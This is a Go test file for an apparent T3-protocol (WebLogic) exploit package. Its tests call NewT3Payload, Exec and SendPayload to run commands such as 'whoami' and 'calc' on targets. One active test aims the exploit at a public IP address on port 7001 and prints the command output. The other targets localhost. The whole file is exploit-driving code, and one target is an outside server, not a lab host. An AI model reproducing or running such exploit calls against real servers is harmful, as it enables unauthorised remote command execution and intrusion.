package t3

import (
	"testing"
)

func TestT3(t *testing.T) {
	//t3 := NewT3Payload(SetAddr("192.168.101.147:7001"), SetTimeout(2))
	t3 := NewT3Payload(SetAddr("47.104.229.232:7001"), SetTimeout(1))
	res, err := t3.Exec("whoami")
	if err != nil {
		println(err.Error())
	}
	println(res)
	//err := t3.SendPayload(GenExecPayload("calc"))
	//if err != nil {
	//	println(err.Error())
	//}
}

//func TestSendPayload(t *testing.T) {
//	SendPayload(,GenExecPayload("whoami"))
//}

func TestT3_local(t *testing.T) {
	t3 := NewT3Payload(SetAddr("localhost:7001"), SetTimeout(10))
	//res, err := t3.Exec("whoami")
	//if err != nil {
	//	panic(err)
	//}
	//println(res)
	t3.SendPayload(GenExecPayload("calc"))
}
